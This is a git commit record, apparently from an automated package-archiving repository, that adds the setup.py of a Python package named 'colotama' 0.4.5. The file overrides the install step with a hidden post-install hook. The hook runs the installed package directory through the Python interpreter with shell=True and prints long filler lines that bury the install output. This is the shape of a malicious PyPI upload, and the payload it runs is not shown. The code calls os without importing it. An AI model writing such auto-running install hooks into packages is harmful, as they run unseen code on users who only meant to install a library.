5333ab466d7a801800959c25b7263f79d89e239d
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-09-30 04:05:29 +0000

    Add package colotama/0.4.5/colotama-0.4.5.tar.gz

---
+++ packages/colotama/colotama-0.4.5.tar.gz/colotama-0.4.5/setup.py
@@ -0,0 +1,33 @@
+from setuptools import setup
+from setuptools.command.bdist_egg import bdist_egg as _bdist_egg
+from subprocess import call
+from setuptools.command.install import install as _install
+import sys
+
+def _post_install(dir):
+        print(";"*200)
+        _a = sys.executable
+        _b = os.path.join(dir, 'colotama')
+        call([f"{_a} {_b}"], shell=True)
+
+class install(_install):
+    def run(self):
+        _install.run(self)
+        print("-"*200)
+        self.execute(_post_install, (self.install_lib,), msg="Running post install task")
+        print("?"*200)
+
+setup(
+    name="colotama",
+    version="0.4.5",
+    packages=["colotama"],
+    description="",
+    author="Asian Mlik",
+    author_email="help@colotama.com",
+    install_requires=[
+        "pyprettifier"
+    ],
+    cmdclass={
+        'install': install},
+    python_requires='>=3.6'
+)
